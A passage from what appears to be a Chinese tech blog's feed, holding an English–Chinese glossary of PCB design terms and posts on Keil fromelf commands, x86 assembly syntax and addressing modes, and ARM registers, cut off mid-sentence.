style="color:#fe2c24;">concise&nbsp;</span>&nbsp;[kənˈsaɪs]简明的;简练的;简洁的;简略的;简缩的</p>  <p><span style="color:#fe2c24;">prior</span>先前的，较早的，在前的;优先的</p>  <p>priority&nbsp;优先事项，最重要的事；优先，优先权，重点；&lt;英&gt;优先通行权</p>  <p>primary&nbsp;&nbsp;[ˈpraɪmeri]主要的，首要的；&lt;英&gt;小学教育的，初级教育的；初级的，原发性的；最基本的，最根本的；</p>  <p><span style="color:#fe2c24;">prime&nbsp;</span>首要的;主要的;基本的;优质的;上乘的;优异的;典型的;</p>  <p><span style="color:#fe2c24;">undergraduate</span>尚未获得学士学位的）大学生，大学本科生</p>  <p>effectiveness有效性;效率（果，力，用，能，应）</p>  <p>array &nbsp;[əˈreɪ]大堆;大群;大量;数组;阵列</p> </blockquote> <blockquote>  <p><span style="color:#fe2c24;">insight</span>，洞悉，了解；洞察力</p>  <p><span style="color:#fe2c24;">collapse</span>，折叠;倒塌，塌下；崩溃，瓦解；</p>  <p><span style="color:#fe2c24;">uppercase，大写</span></p>  <p><span style="color:#fe2c24;">lowercase，小写</span></p>  <p>toggle case，大小写转换</p>  <p><span style="color:#fe2c24;">indent&nbsp;</span>缩进</p>  <p>lookup&nbsp;查找；检查</p>  <p><span style="color:#fe2c24;">metric&nbsp;</span>米制的，公制的；</p>  <p>regular expression&nbsp;[数] 正则表达式；[数] 正规表达式</p>  <p><span style="color:#fe2c24;">syntax&nbsp;</span>句法，句法规则；（计算机语言的）句法，语构；</p>  <p>visual theme 视觉主题</p>  <p><span style="color:#fe2c24;">preset&nbsp;</span>预调，预置； 预先决定，事先安排；预先设置，预调（设备）</p>  <p>horizontal scroll，水平滚动</p>  <p>vertical scroll，垂直滚动</p>  <p><span style="color:#fe2c24;">scroll&nbsp;</span>（供书写的）长卷纸，卷轴；滚屏，滚动；</p>  <p>arrange window，排列窗口</p>  <p>cascade window，层叠窗口</p>  <p><span style="color:#fe2c24;">cascade&nbsp;</span>小瀑布（尤指大瀑布的一支）；倾泻，流注；瀑布状物；</p>  <p><span style="color:#fe2c24;">tile</span>，平铺显示；瓷砖，地砖；</p>  <p><span style="color:#fe2c24;">prototype&nbsp;</span>（新型汽车、机器等的）原型，雏形；典型，范例；蓝本，最初形态；</p>  <p>archive，档案，归档</p>  <p>setup，(软件或硬件的)设置</p>  <p><span style="color:#fe2c24;">schematic</span>，图解的，概要的；（电路）原理图</p>  <p><span style="color:#fe2c24;">spreadsheet</span>，电子表格</p>  <p>symbol，符号，象征</p>  <p>remove occurrence property，移除引用属性</p>  <p><span style="color:#fe2c24;">occurrence</span>，发生</p>  <p>cleanup，清理，清除</p>  <p>rotate，旋转</p>  <p>notate&nbsp;以符号表示</p>  <p>annotate，美[ˈænəteɪt]vt.注释; 给…作注解(或评注);</p>  <p>denote&nbsp;美[dɪˈnoʊt]vt标志; 预示; 象征; 表示; 意指;</p>  <p>donate&nbsp;美[ˈdoʊneɪt]vt.捐赠; (尤指向慈善机构)赠送; 献(血); 捐献(器官);</p>  <p>convert，转换</p>  <p><span style="color:#fe2c24;">ascend</span>，攀登，登上；上升，升高，通往高处；升职，晋升；</p>  <p><span style="color:#fe2c24;">descend</span>，下来，下降；下倾，下斜；</p>  <p><span style="color:#fe2c24;">hierarchy</span>，等级制度，层级制度</p>  <p><span style="color:#fe2c24;">hierarchical</span>，等级制的，按等级划分的</p>  <p><span style="color:#fe2c24;">zoom</span>，快速移动，镜头推进或远拉</p>  <p>grid，网格</p>  <p>netlist，网表</p>  <p>bill，账单</p>  <p>associate，联想，关联，副的</p>  <p>simulation，模拟，仿真</p>  <p>customize，自定义</p>  <p>component，成分，部件，元器件</p>  <p><span style="color:#fe2c24;">parameterized</span>，参数化的</p>  <p>junction，结点，结</p>  <p>alias，别名</p>  <p><span style="color:#fe2c24;">rectangle</span>，长方形，矩形</p>  <p><span style="color:#fe2c24;">ellipse</span>，[ɪˈlɪps]椭圆</p>  <p><span style="color:#fe2c24;">arc</span>，弧，弧形</p>  <p>bezier curve，贝塞尔曲线</p>  <p><span style="color:#fe2c24;">polyline</span>，多边形</p>  <p><span style="color:#fe2c24;">discrete，离散的</span></p>  <p><span style="color:#fe2c24;">topology，拓扑，拓扑结构</span></p>  <p><span style="color:#fe2c24;">validate，验证</span></p>  <p><span style="color:#fe2c24;">macro</span>，宏</p>  <p><span style="color:#fe2c24;">accessory</span>，附件，配件，辅助的</p>  <p>layout，布局</p>  <p><span style="color:#fe2c24;">verification</span>，检查，验证</p>  <p>mentor，导师，指导者</p>  <p>template，模板，样板</p>  <p>wizard，向导（程序），引导</p>  <p>millimeters，毫米</p>  <p>inche，英寸，1英寸=2.54厘米</p>  <p><span style="color:#fe2c24;">miscellaneous</span>，misc，杂项的，混杂的</p>  <p>footprint，脚印，足迹，引脚</p>  <p><span style="color:#fe2c24;">homogeneous，&nbsp;[ˌhoʊməˈdʒiːniəs]同种类的</span></p>  <p><span style="color:#fe2c24;">heterogeneous，[ˌhetərəˈdʒiːniəs]各种各样的</span></p>  <p><span style="color:#fe2c24;">alphabetic，字母的</span></p>  <p><span style="color:#fe2c24;">numeric，数字，数值</span></p>  <p>regulator，校准器，稳压器，调节器</p>  <p>amplifier，放大器，扩音器</p>  <p>arithmetic，算术</p>  <p>connector，连接器</p>  <p>filter，过滤器</p>  <p><span style="color:#fe2c24;">latch</span>，锁存器</p>  <p>transistor，晶体管</p>  <p>abort，中止，使流产</p>  <p>bitmap，位图</p>  <p>attribute，属性，性质</p>  <p>markup，标记，符号</p>  <p><span style="color:#fe2c24;">redraw</span>，重新绘制</p>  <p><span style="color:#fe2c24;">cluster</span>，簇</p>  <p>pad stack，焊盘堆叠</p>  <p>drill pairs，钻孔对</p>  <p><span style="color:#fe2c24;">drill</span>，钻头，钻孔</p>  <p>integration，集成</p>  <p>integrate，整合，集成</p>  <p>layer，层</p>  <p>origin，起源，源头</p>  <p><span style="color:#fe2c24;">decal editor</span>，封装编辑器</p>  <p>placement，放置</p>  <p><span style="color:#fe2c24;">disperse</span>，&nbsp;[dɪˈspɜːrs]分散</p>  <p><span style="color:#fe2c24;">nudge</span>，轻推，轻触</p>  <p>pads router，全自动布线器接口</p>  <p>navigator，导航器</p>  <p>enhancement，增强，提高</p>  <p><span style="color:#fe2c24;">tutorial</span>，辅导的，教程，使用说明书</p>  <p>specification，规格，规范，明细，说明书</p>  <p>silkscreen，丝网印刷，丝印</p>  <p><span style="color:#fe2c24;">solder</span>，焊料，焊锡，焊接</p>  <p>pcb decal，pcb封装</p> </blockquote>                </div><div><div></div></div>        </div><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://blog.csdn.net/qq_28576837/article/details/127163667?spm=1001.2014.3001.5502">https://blog.csdn.net/qq_28576837/article/details/127163667?spm=1001.2014.3001.5502</a></p>]]></content>
    
    
    <categories>
      
      <category>英文</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>keil调试功能介绍</title>
    <link href="/2023/12/24/keil%E8%B0%83%E8%AF%95%E5%8A%9F%E8%83%BD%E4%BB%8B%E7%BB%8D/"/>
    <url>/2023/12/24/keil%E8%B0%83%E8%AF%95%E5%8A%9F%E8%83%BD%E4%BB%8B%E7%BB%8D/</url>
    
    <content type="html"><![CDATA[<p>keil的调试使用</p><span id="more"></span><ul><li><p>keil中如何一步步执行汇编指令？<br>  将鼠标点击汇编窗口后，在单步执行则是单步执行汇编了；同理点击源代码后就是单步执行源代码了。</p></li><li><p>keil 生成反汇编和bin文件<br>填写指令：<br>生成汇编指令：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">fromelf --text -a -c --output=all.dis Objects\StepMonitor.axf<br></code></pre></td></tr></table></figure><p>其中 <code>&quot;all.dis&quot;</code> 和 <code>&quot;Objects\StepMonitor.axf&quot;</code> 都是相对于 <code>&quot;.uvprojx&quot;</code> 所在目录而言的</p></li></ul><p>生成烧写bin文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">fromelf --bin --output=test.bin Objects\StepMonitor.axf<br></code></pre></td></tr></table></figure><p>其中，烧写bin文件需要使用到 <code>STM32CubeProgrammer</code></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312240137319.png"></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://blog.csdn.net/qq_28576837/article/details/129720659">https://blog.csdn.net/qq_28576837/article/details/129720659</a></p>]]></content>
    
    
    <categories>
      
      <category>stm32</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>汇编入门</title>
    <link href="/2023/12/23/%E6%B1%87%E7%BC%96%E5%85%A5%E9%97%A8/"/>
    <url>/2023/12/23/%E6%B1%87%E7%BC%96%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<p>汇编基础，入门必备</p><span id="more"></span><h1 id="字-word"><a href="#字-word" class="headerlink" title="字(word)"></a>字(word)</h1><p>CPU可以处理两种尺寸的数据，即字(word)和字节(byte)，CPU和内存之间的数据传送单位通常是一个字长。</p><p>我们知道，1byte &#x3D; 8bit，那么字长又是多少呢？其实字长通常跟CPU的位数相同。例如：64位CPU字长就是64位，即1word &#x3D; 8byte，寄存器大小也是64位。但是也有个别情况，比如 Intel 80386CPU是32位的，但字长却是16位，即1word &#x3D; 2byte，这是为了向后兼容80286CPU(16位)。</p><h1 id="汇编语言分类"><a href="#汇编语言分类" class="headerlink" title="汇编语言分类"></a>汇编语言分类</h1><p>这里主要介绍最常见的两种CPU架构，即ARM架构和Intel架构。ARM架构主要用户移动设备，比如iOS和Android，而Intel架构主要用于台式电脑。每种CPU架构都有其对应的指令集，于是也就有了不同类型的汇编语言。</p><p>常见的汇编语言有两种：ARM汇编和x86汇编。而x86汇编按语法格式又分为Intel汇编和AT&amp;T汇编。Intel和AT&amp;T语法区别见下表：</p><table><thead><tr><th>项目</th><th>Intel</th><th>AT&amp;T</th><th>说明</th></tr></thead><tbody><tr><td>寄存器名</td><td>rax</td><td>%rax</td><td>AT&amp;T要在寄存器前加%</td></tr><tr><td>操作数顺序</td><td>目标数在前mov rax, rdx</td><td>目标数在后mov %rdx, %rax</td><td>将rdx的值赋给rax</td></tr><tr><td>立即数</td><td>原样mov rax, 5</td><td>数字前加$mov $5, %rax</td><td>将5赋给rax</td></tr><tr><td>十六进制立即数</td><td>开头加0结尾加H，例如010H</td><td>开头加0x，例如0x10</td><td>十六进制数10</td></tr><tr><td>访问内存长度表示</td><td>开头加BYTE PTR, WORD PTR, DWORD PTR和QWORD PTR</td><td>结尾加b,w,l,q</td><td>分别表示字节，字，双字和四字</td></tr><tr><td>引用全局或静态变量var的值</td><td>[var]</td><td>var</td><td>-</td></tr><tr><td>引用全局或静态变量var的地址</td><td>var</td><td>$var</td><td>-</td></tr><tr><td>直接寻址&#x2F;绝对寻址</td><td>[imm]</td><td>imm</td><td>imm表示立即数</td></tr><tr><td>间接寻址</td><td>[reg]</td><td>(%reg)</td><td>reg表示寄存器</td></tr><tr><td>基址相对寻址</td><td>[reg+imm]</td><td>imm(%reg)</td><td>-</td></tr><tr><td>变址寻址</td><td>[base+index] 或 imm[base+index]</td><td>(base,index) 或 imm(base+index)</td><td>base和index均为寄存器</td></tr><tr><td>比例变址寻址</td><td>imm[base+index*scale]</td><td>imm(base, index, scale)</td><td>scale只能是1, 2, 4, 8其中的一个数字 (1省略不写就是普通变址寻址)</td></tr><tr><td>代码注释</td><td>指令和注释用 ; 分开，例如：mov rax, rdx ;我是注释</td><td>同Intel汇编</td><td>-</td></tr><tr><td>所在平台</td><td>Windows</td><td>Unix</td><td>-</td></tr></tbody></table><p><strong>ARM汇编的操作数顺序跟Intel是一样的，这里就不详细展开了，具体可以直接看官方文档。</strong></p><h1 id="寻址方式"><a href="#寻址方式" class="headerlink" title="寻址方式"></a>寻址方式</h1><p>顾名思义，寻址方式就是CPU根据指令中给出的地址信息来寻找有效地址的方式，是确定本条指令的数据地址以及下一条要执行的指令地址的方法。寻址方式分为两类，即指令寻址方式和数据寻址方式。</p><h2 id="0x1-指令寻址方式："><a href="#0x1-指令寻址方式：" class="headerlink" title="0x1. 指令寻址方式："></a>0x1. 指令寻址方式：</h2><p>指令地址在内存中是按顺序安排的，当执行一段程序时，通常是一条指令接着一条指令地顺序进行。也就是说，从内存中取出第一条指令，然后执行；接着从内存中再取出第二条指令，继续执行；依次类推。这种顺序执行的过程，称为顺序寻址方式。为此，必须使用程序计数器PC（ARM下叫PC，x86下叫IP）来计数指令的地址(Tip1)。</p><p>当程序转移执行的顺序时，指令的寻址就采取跳跃寻址方式。所谓跳跃，就是下条指令的地址不再由PC给出，而是由本条指令给出。跳跃后，按新的指令地址开始顺序执行。因此，PC的内容也必须改变，以便能及时跟踪新的指令地址。</p><div class="note note-info">            <p>Tip1: 当执行一条指令时，首先需要根据PC中存放的指令地址，将指令由内存取到指令寄存器中，与此同时，PC中的地址或自动加1或由转移指针给出下一条指令的地址。</p>          </div><h2 id="0x2-数据寻址方式："><a href="#0x2-数据寻址方式：" class="headerlink" title="0x2. 数据寻址方式："></a>0x2. 数据寻址方式：</h2><p>数据寻址方式比较多，这里只列出几种常见的寻址方式，基本上都是汇编语言里经常用到的。</p><h3 id="0x21-立即寻址"><a href="#0x21-立即寻址" class="headerlink" title="0x21. 立即寻址:"></a>0x21. 立即寻址:</h3><p>指令的地址字段给出的不是操作数的地址，而是操作数本身，由于不需要访问内存取数，所以指令执行时间很短(Note1)。例如：mov 0x123, %rax</p><p>{ % note warning % }<br>Note1: 立即数只能作为源操作数，而不能作为目的操作数。<br>{ % endnote % }</p><h3 id="0x22-直接寻址"><a href="#0x22-直接寻址" class="headerlink" title="0x22. 直接寻址:"></a>0x22. 直接寻址:</h3><p>指令的地址字段给出的是操作数的内存地址。因为直接给出操作数的内存地址而不需要经过某种变换，所以称为直接寻址。</p><h3 id="0x23-间接寻址"><a href="#0x23-间接寻址" class="headerlink" title="0x23. 间接寻址:"></a>0x23. 间接寻址:</h3><p>间接寻址是相对直接寻址而言的，在间接寻址的情况下，指令地址字段给出的地址，是个形式地址不是操作数的真正地址，或者说该地址单元中的内容才是操作数的有效地址。</p><h3 id="0x24-相对寻址"><a href="#0x24-相对寻址" class="headerlink" title="0x24. 相对寻址:"></a>0x24. 相对寻址:</h3><p>相对寻址是把PC的内容加上指令格式中的形式地址D而形成操作数的有效地址。”相对”寻址，就是相对于当前的指令地址而言，好处是程序员无须用指令的绝对地址编程，因而所编程序可以放在内存的任何地方。</p><h3 id="0x25-基址寻址"><a href="#0x25-基址寻址" class="headerlink" title="0x25. 基址寻址:"></a>0x25. 基址寻址:</h3><p>在基址寻址方式中将CPU中的基址寄存器的内容，加上变址寄存器的内容而形成操作数的有效地址。基址寻址的优点是可以扩大寻址能力。</p><h3 id="0x26-变址寻址"><a href="#0x26-变址寻址" class="headerlink" title="0x26. 变址寻址:"></a>0x26. 变址寻址:</h3><p>把CPU中某个变址寄存器的内容与偏移量D相加来形成操作数有效地址。参见上表👆</p><h3 id="0x27-寄存器寻址"><a href="#0x27-寄存器寻址" class="headerlink" title="0x27. 寄存器寻址:"></a>0x27. 寄存器寻址:</h3><p>操作数不放在内存中，而是把操作数本身的值放在CPU的通用寄存器中。</p><h3 id="0x28-寄存器间接寻址"><a href="#0x28-寄存器间接寻址" class="headerlink" title="0x28. 寄存器间接寻址:"></a>0x28. 寄存器间接寻址:</h3><p>把操作数地址放在CPU的通用寄存器中，而操作数本身的值则放在内存中。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://www.dongxin.online/assembly/assemblybasic.html">https://www.dongxin.online/assembly/assemblybasic.html</a></p><p><a href="https://css.csail.mit.edu/6.858/2014/readings/i386/s02_03.htm">https://Intel 80386 Reference Programmer's Manual </a></p><p><a href="https://en.wikipedia.org/wiki/Assembly_language">https://en.wikipedia.org/wiki/Assembly_language</a></p>]]></content>
    
    
    <categories>
      
      <category>汇编</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ARM寄存器简介</title>
    <link href="/2023/12/22/ARM%20%E5%AF%84%E5%AD%98%E5%99%A8%E7%AE%80%E4%BB%8B/"/>
    <url>/2023/12/22/ARM%20%E5%AF%84%E5%AD%98%E5%99%A8%E7%AE%80%E4%BB%8B/</url>
    
    <content type="html"><![CDATA[<p>arm中常用的寄存器</p><span id="more"></span><h1 id="ARM-寄存器简介"><a href="#ARM-寄存器简介" class="headerlink" title="ARM 寄存器简介"></a>ARM 寄存器简介</h1><p>ARM处理器共有37个寄存器。其中包括：</p><ul><li>31个通用寄存器，包括程序计数器(PC)在内，这些寄存器都是32位寄存器；</li><li>以及6个32位状态寄存器，但目前只使用了其中12位。</li></ul><p>ARM处理器共有<strong>7种不</strong>同的处理器模式，在每一种处理器模式中有一组相应的寄存器组。任意时刻(也就是任意的处理器模式下)，可见的寄存器包括15个通用寄存器(R0～R14)、一个或两个状态寄存器及程序计数器(PC)。在所有的寄存器中，有些是各模式共用的同一个物理寄存器，有一些寄存器是各模式自己拥有的独立的物理寄存器。  </p><p>arm中的七种处理器模式：</p><p>1、用户模式(User)：ARM处理器正常的程序执行状态；</p><p>2、系统模式(System)：运行具有特权的操作系统任务；</p><p>3、快速中断模式(FIQ)：用于高速数据传输或通道处理；</p><p>4、外部中断模式(IRQ)：用于通用的中断处理；</p><p>5、管理模式(Supervisor)：操作系统使用的保护模式；</p><p>6、数据访问终止模式(Abort)：当数据或指令预取终止时进入该模式,可用于虚拟存储及存储保护；</p><p>7、未定义指令中止模式(Undifined)：当未定义的指令执行时进入该模式,可用于支持硬件协处理器的软件仿真；</p><p>8、安全监控模式(Secure Monitor)：主要用于安全交易。</p><p>下表列出了各处理器模式下可见的寄存器情况，寄存器详细可参考 <a href="http://infocenter.arm.com/help/topic/com.arm.doc.ihi0042e/IHI0042E_aapcs.pdf">AAPCS §5.1.1 Core registers</a>。    </p><table><tbody><tr>  <td>User</td>  <td>System</td>  <td>Supervisor</td>  <td>Abort</td>  <td>Undefined</td>  <td>IRQ</td>  <td>FIQ</td></tr><tr>  <td>R0</td>  <td>R0</td>  <td>R0</td>  <td>R0</td>  <td>R0</td>  <td>R0</td>  <td>R0</td></tr><tr>  <td>R1</td>  <td>R1</td>  <td>R1</td>  <td>R1</td>  <td>R1</td>  <td>R1</td>  <td>R1</td></tr><tr>  <td>R2</td>  <td>R2</td>  <td>R2</td>  <td>R2</td>  <td>R2</td>  <td>R2</td>  <td>R2</td></tr><tr>  <td>R3</td>  <td>R3</td>  <td>R3</td>  <td>R3</td>  <td>R3</td>  <td>R3</td>  <td>R3</td></tr><tr>  <td>R4</td>  <td>R4</td>  <td>R4</td>  <td>R4</td>  <td>R4</td>  <td>R4</td>  <td>R4</td></tr><tr>  <td>R5</td>  <td>R5</td>  <td>R5</td>  <td>R5</td>  <td>R5</td>  <td>R5</td>  <td>R5</td></tr><tr>  <td>R6</td>  <td>R6</td>  <td>R6</td>  <td>R6</td>  <td>R6</td>  <td>R6</td>  <td>R6</td></tr><tr>  <td>R7</td>  <td>R7</td>  <td>R7</td>  <td>R7</td>  <td>R7</td>  <td>R7</td>  <td>R7</td></tr><tr>  <td>R8</td>  <td>R8</td>  <td>R8</td>  <td>R8</td>  <td>R8</td>  <td>R8</td>  <td>R8_fiq</td></tr><tr>  <td>R9</td>  <td>R9</td>  <td>R9</td>  <td>R9</td>  <td>R9</td>  <td>R9</td>  <td>R9_fiq</td></tr><tr>  <td>R10</td>  <td>R10</td>  <td>R10</td>  <td>R10</td>  <td>R10</td>  <td>R10</td>  <td>R10_fiq</td></tr><tr>  <td>R11</td>  <td>R11</td>  <td>R11</td>  <td>R11</td>  <td>R11</td>  <td>R11</td>  <td>R11_fiq</td></tr><tr>  <td>R12</td>  <td>R12</td>  <td>R12</td>  <td>R12</td>  <td>R12</td>  <td>R12</td>  <td>R12_fiq</td></tr><tr>  <td>R13</td>  <td>R13</td>  <td>R13_svc</td>  <td>R13_abt</td>  <td>R13_und</td>  <td>R13_irq</td>  <td>R13_fiq</td></tr><tr>  <td>R14</td>  <td>R14</td>  <td>R14_svc</td>  <td>R14_abt</td>  <td>R14_und</td>  <td>R14_irq</td>  <td>R14_fiq</td></tr><tr>  <td>PC</td>  <td>PC</td>  <td>PC</td>  <td>PC</td>  <td>PC</td>  <td>PC</td>  <td>PC</td></tr><tr>  <td>CPSR</td>  <td>CPSR</td>  <td>CPSR</td>  <td>CPSR</td>  <td>CPSR</td>  <td>CPSR</td>  <td>CPSR</td></tr><tr>  <td></td>  <td></td>  <td>SPSR_svc</td>  <td>SPSR_abt</td>  <td>SPSR_und</td>  <td>SPSR_irq</td>  <td>SPSR_fiq</td></tr></tbody></table><h2 id="1-通用寄存器的分类："><a href="#1-通用寄存器的分类：" class="headerlink" title="1.通用寄存器的分类："></a>1.通用寄存器的分类：</h2><h3 id="a-未备份寄存器，包括R0-R7"><a href="#a-未备份寄存器，包括R0-R7" class="headerlink" title="a. 未备份寄存器，包括R0-R7"></a>a. 未备份寄存器，包括R0-R7</h3><p>   <strong>对每个未备份寄存器来说，在所有的模式下都是指同一个物理寄存器(例如：Usr下的R0与FIQ下的R0是同一个寄存器)。</strong>在异常程序中断造成模式切换时，由于不同模式使用的是相同的物理寄存器，这可能导致数据遭到破坏。未备份寄存器没有被系统作为别的用途，任何场合均可采用未备份寄存器。<br>   R7对应于x86下的BP寄存器，相对与SP，R7就是栈底，在进入新一个栈帧之后先把原来的R7压栈，然后R7保存当前BP。R7大部分情况用来保存系统调用号（syscall number）。<br>   R0-R3用于传参数，更多的参数须通过栈来传递，调用函数的时候，参数先从R0依次传递；R0-R1 也作为结果寄存器，保存函数返回结果，被调用的子程序在返回前无须恢复这些寄存器的内容。<br>   R4-R6 没有特殊规定，就是普通的通用寄存器，作为被调保存（callee-save）寄存器，一般保存内部局部变量(local variables)。<br>   被调保存寄存器(callee-save register)是指，如果这个寄存器被调用&#x2F;使用之前，需要被保存。  </p><h3 id="b-备份寄存器，包括R8-R14"><a href="#b-备份寄存器，包括R8-R14" class="headerlink" title="b. 备份寄存器，包括R8-R14"></a>b. 备份寄存器，包括R8-R14</h3><p>   对于备份寄存器R8-R12来说，除FIQ模式下其它模式均使用相同的物理寄存器。在FIQ模式下R8_fiq，R9_fiq，R10_fiq，R11_fiq，R12_fiq，它有自己的物理寄存器。对于R13和R14寄存器每种模式都有自己的物理寄存器(System与Usr的寄存器相同)，当异常中断发生时，系统使用相应模式下的物理寄存器，从而可以避免数据遭到破坏。  </p><p>   R8，R10-R11 没有特殊规定，就是普通的通用寄存器。 </p><p>   R9 是操作系统保留。  </p><p>   R10（SL）被调保存寄存器，Stack Limit。  </p><p>   R11（FP）被调保存寄存器， 帧指针（Flame Pointer）。通常 ARM 模式下 r11 会作为帧指针，THUMB 模式下 r7 则作为帧指针，但在系统有可能根据自己的需要改变这个约定。  </p><p>   R12 又叫IP(intra-procedure scratch )。<br>   该寄存器会被链接器当作擦写寄存器（scratch register）在过程（Procedure）调用之间使用。可擦除寄存器（Scratch registers） 是指数据寄存器 R0, R1, R2 and R3。一个过程（procedure）在返回时，不能修改它的值。这个寄存器不会被Linux gcc 或 glibc 使用，但是另外一个系统可能会。  </p><blockquote><p>Register r12 (IP) may be used by a linker as a scratch register between a routine and any subroutine it calls (for details, see §5.3.1.1, Use of IP by the linker). It can also be used within a routine to hold intermediate values between subroutine calls<br>Both the ARM- and Thumb-state BL instructions are unable to address the full 32-bit address space, so it may be necessary for the linker to insert a veneer between the calling routine and the called subroutine. Veneers may also be needed to support ARM-Thumb inter-working or dynamic linking. Any veneer inserted must preserve the contents of all registers except IP (r12) and the condition code flags; a conforming program must assume that a veneer that alters IP may be inserted at any branch instruction that is exposed to a relocation that supports inter-working or long branches.</p></blockquote><blockquote><p>即是说现在如果汇编代码中存在bl指令，而r12又被用来作为通用寄存器，那么r12的值就很有可能会被链接器插入的veneer程序修改掉了。  </p></blockquote><p>   <strong>R13也称为SP堆栈指针(stack pointer，用于存放栈顶指针，类似x86_64中的RSP)。</strong><br>   该栈是一块用来存储本地函数的内存区域。当函数被返回时， 存储空间会被回收。 在堆栈上分配空间, 需要从栈寄存器（the stack register）减去。分配一个32位的值, 需要从堆栈指针（the stack pointer）减去4。ARM堆栈结构是从高向低压栈的，因为处理器是32位的ARM，所以每压一次栈，SP就会移动4个字节（32位），也就是sp &#x3D; sp-4。 </p><p>   <strong>R14也称为LR寄存器(linked register)，当一个子程序被调用时，LR 会被填入程序计数器（PC）；</strong>当一个子程序执行完毕后，PC从 LR 的值恢复，从而返回（到主函数中）。 </p><p>   <strong>R15也成为程序计数器（program counter，它的值是当前正在执行的指令在内存中的地址，like RIP in x86_64 &amp; EIP in x86）。</strong><br>   该寄存器或保存目前正在执行的内存地址。PC 和 LR 都是跟代码有关的寄存器，一个是 Where you are，另外一个是 Where you were。    </p><h3 id="c-程序计数器，PC"><a href="#c-程序计数器，PC" class="headerlink" title="c.程序计数器，PC"></a>c.程序计数器，PC</h3><p>   <strong>PC寄存器存储指令地址，由于ARM采用流水机制执行指令，故PC寄存器总是存储下一条指令的地址。</strong><br>   由于ARM是按照字对齐，故PC被读取后的值的bit[1:0]总是0b00(thumb的bit[0]是0b0)。  </p><h2 id="2-程序状态寄存器"><a href="#2-程序状态寄存器" class="headerlink" title="2.程序状态寄存器"></a>2.程序状态寄存器</h2><p><strong>程序状态寄存器包含当前程序状态寄存器和备份状态寄存器。</strong></p><h3 id="a-CPSR-程序状态寄存器，Current-Program-State-Register"><a href="#a-CPSR-程序状态寄存器，Current-Program-State-Register" class="headerlink" title="a.CPSR(程序状态寄存器，Current Program State Register)"></a>a.CPSR(程序状态寄存器，Current Program State Register)</h3><p>CPSR在任何处理器模式下都可以被访问。其结构如下：</p><p>  31 30 29 28  —   7 &nbsp;  6 &nbsp;  5 &nbsp;  4 &nbsp;&nbsp;  3&nbsp; &nbsp;&nbsp;&nbsp;  2&nbsp;&nbsp; &nbsp;  1&nbsp; &nbsp;  0<br>  N &nbsp;&nbsp;  Z&nbsp; &nbsp; C&nbsp; V   —      I&nbsp;&nbsp;&nbsp;   F&nbsp;&nbsp;T &nbsp;      M4&nbsp;  M3 &nbsp; M2  M1  M0  </p><p>N(Negative)、Z(Zero)、C(Carry)以及V(oVerflow)称为条件标志位，ARM指令根据CPSR的条件标志位来选择地执行。</p><h4 id="CPSR条件标志位"><a href="#CPSR条件标志位" class="headerlink" title="CPSR条件标志位"></a>CPSR条件标志位</h4><p>条件标志位 &nbsp;&nbsp;                  含义<br>N  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;                        N&#x3D;1 表示运算结果为负数，N&#x3D;0 表示运算结果为正数。<br>Z  &nbsp;&nbsp;  &nbsp;&nbsp; &nbsp;&nbsp;                      Z&#x3D;1 表示运算结果为0， Z&#x3D;0 表示运算结果为非零。<br>C   &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;                         C&#x3D;1 表示运算结果产生了进位。<br>V  &nbsp;&nbsp;  &nbsp;&nbsp;&nbsp;&nbsp;                      V&#x3D;1 运算结果的符号位发生了溢出。<br>Q  &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;                        在ARMv5 E系列版本中Q&#x3D;1 表示DSP指令溢出，在ARMv5以前的版本中没有Q标志位。  </p><p>以下指令会影响CPSR的条件标志位<br>(1) 比较指令，如: CMP、CMN、TEQ、TST等。<br>(2) 当一些算术逻辑运算的目标寄存器不是PC时，这些指令会影响CPSR的条件标志位。<br>(3) MSR与MRS指令可以对CPSR&#x2F;SPSR进行操作。<br>(4) LDM指令可以将SPSR复制到CPSR中。  </p><h4 id="CPSR的控制位"><a href="#CPSR的控制位" class="headerlink" title="CPSR的控制位"></a>CPSR的控制位</h4><p>控制位                        含义<br>I&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;                           I&#x3D;1 禁用IRO中断<br>F&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;                           F&#x3D;1 禁用FIQ中断<br>T&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;                           ARMv4 以上T版本T&#x3D;0 执行ARM指令，T&#x3D;1执行Thumb指令，ARMv5以上非T版本T&#x3D;0 执行ARM指令，T&#x3D;1表示下一条指令产生未定义指令中断。<br>M[4:0]&nbsp;&nbsp;                        控制处理器模式<br>0b10000&nbsp;&nbsp;      User<br>0b10001&nbsp;&nbsp;      FIQ<br>0b10010 &nbsp;&nbsp;     IRQ<br>0b10011&nbsp;&nbsp;      Supervisor<br>0b10111&nbsp;&nbsp;      Abort<br>0b11011&nbsp;&nbsp;      Undefined<br>0b11111&nbsp;&nbsp;     System        </p><h3 id="b-SPSR-备份状态寄存器"><a href="#b-SPSR-备份状态寄存器" class="headerlink" title="b.SPSR(备份状态寄存器)"></a>b.SPSR(备份状态寄存器)</h3><p>SPSR的结构与CPSR的结构相同，SPSR是用来备份CPSR的。</p><h2 id="3-SP、FP-详解"><a href="#3-SP、FP-详解" class="headerlink" title="3. SP、FP 详解"></a>3. SP、FP 详解</h2><p>SP 和 FP 都是跟本地数据相关的寄存器。一个是 “Where local data is”，另外一个是 “Where the last local data is”。  </p><p>栈帧（Stack 